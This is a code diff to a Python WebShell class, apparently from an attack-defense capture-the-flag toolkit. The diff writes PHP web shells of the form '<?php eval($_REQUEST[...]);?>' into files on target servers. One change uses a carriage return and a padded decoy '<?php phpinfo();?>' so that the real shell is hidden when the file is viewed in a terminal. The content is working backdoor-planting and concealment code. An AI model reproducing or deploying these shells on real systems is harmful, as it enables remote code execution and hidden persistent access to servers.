@@ -97,8 +97,8 @@ class WebShell():
             return []
 
     def auto_inject_memery_webshell(self, filename, password):
-        content = "<?php eval($_REQUEST[%s]);?>" % (password)
-        Log.info("Building webshell : %s" % (repr))
+        content = '<?php eval($_REQUEST["%s"]);?>' % (password)
+        Log.info("Building webshell : %s" % (repr(content)))
         self.auto_inject_memery_phpfile(filename, content)
 
     def auto_inject_memery_phpfile(self, filename, content):
@@ -545,7 +545,10 @@ class WebShell():
 
 
     def auto_inject_webshell(self, filename, password):
-        content = "<?php eval($_REQUEST[%s]);?>\r<?php phpinfo();?>                                        \n" % (password)
+        webshell_content = "<?php eval($_REQUEST['%s']);?>" % (password)
+        fake_content = "<?php phpinfo();?>"
+        padding = " " * (len(webshell_content) - len(fake_content))
+        content = webshell_content + "\r" + fake_content + padding + "\n"
         self.auto_inject_phpfile(filename, content)
 
     def auto_inject_flag_reaper(self, filename, content):
